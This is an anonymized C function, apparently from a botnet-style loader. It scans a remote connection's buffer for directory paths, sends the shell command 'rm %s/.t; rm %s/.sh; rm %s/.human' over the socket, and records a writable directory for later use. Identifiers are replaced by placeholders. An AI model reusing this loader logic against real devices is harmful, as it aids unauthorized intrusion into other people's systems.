
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int writedir; } ;
struct connection {int rdbuf_pos; TYPE_1__ info; int fd; scalar_t__ rdbuf; } ;
typedef scalar_t__ BOOL ;


 scalar_t__ VAR_0 ;
 char* VAR_1 ;
 scalar_t__ VAR_2 ;
 char* VAR_3 ;
 int FUNC_0 (struct connection*) ;
 int FUNC_1 (int ,char*) ;
 int FUNC_2 (char*) ;
 char* FUNC_3 (scalar_t__,char*) ;
 int FUNC_4 (scalar_t__,int,char*,int) ;
 int FUNC_5 (int ,char*,char*,char*,char*) ;

int FUNC_6(struct connection *VAR_4)
{
    int VAR_5, VAR_6, VAR_7, VAR_8 = 0;
    BOOL VAR_9 = VAR_0;

    if ((VAR_5 = FUNC_4(VAR_4->rdbuf, VAR_4->rdbuf_pos, VAR_1, FUNC_2(VAR_1))) == -1)
        return 0;

    while (VAR_2)
    {
        char *VAR_10;
        int VAR_11;

        VAR_7 = FUNC_4(VAR_4->rdbuf + VAR_8, VAR_5 - VAR_8, VAR_3, FUNC_2(VAR_3));
        if (VAR_7 == -1)
            break;
        VAR_8 += VAR_7;

        VAR_10 = FUNC_3(VAR_4->rdbuf + VAR_8, "\n");
        if (VAR_10 == ((void*)0))
            continue;
        VAR_11 = FUNC_2(VAR_10);

        if (VAR_10[VAR_11 - 1] == '\r')
            VAR_10[VAR_11 - 1] = 0;

        FUNC_5(VAR_4->fd, "rm %s/.t; rm %s/.sh; rm %s/.human\r\n", VAR_10, VAR_10, VAR_10);
        if (!VAR_9)
        {
            if (VAR_11 < 31)
            {
                FUNC_1(VAR_4->info.writedir, VAR_10);
                VAR_9 = VAR_2;
            }
            else
                FUNC_0(VAR_4);
        }
    }

    return VAR_5;
}
